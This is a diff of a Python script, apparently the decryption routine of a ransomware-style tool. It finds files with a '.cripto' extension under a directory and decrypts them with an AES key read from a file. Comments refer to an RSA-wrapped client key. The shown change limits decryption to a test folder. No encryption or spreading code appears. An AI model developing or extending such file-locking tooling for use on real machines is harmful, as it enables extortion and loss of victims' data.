@@ -50,20 +50,23 @@ def decrypt_all():
     #print('[*] chave privada do cliente descriptografada')
     #RSA_to_AES()
     #print('[*] chave AES descriptografada')
-    f = open(caminho_correto + 'AES.txt','r')
+    f = open(caminho_correto + 'AES.gnncry','r')
     chave_aes = f.read()
-    decrypt(chave_aes, os.path.expanduser('~'))
+    decrypt(chave_aes, '/home/tarcisio/Desktop/testes/')
 
 
 def decrypt(key, diretorio):
+    files_to_decrypt = []
     for caminho, diretorio, arquivo in os.walk(diretorio):
         for arq in arquivo:
-            a = caminho+'/'+arq
-            extensao = os.path.splitext(a)
+            file_found = os.path.join(caminho, arq)
+            extensao = os.path.splitext(file_found)
             if(extensao[1] == '.cripto'):
-                a = a.replace(" ", "\ ").replace(" (", " \("). replace(")", "\)")
-                descriptografa(key, a)
+                files_to_decrypt.append(file_found)
 
+
+    for e in files_to_decrypt:
+        descriptografa(key,e)
 
 if __name__ == '__main__':
     os.system('clear')
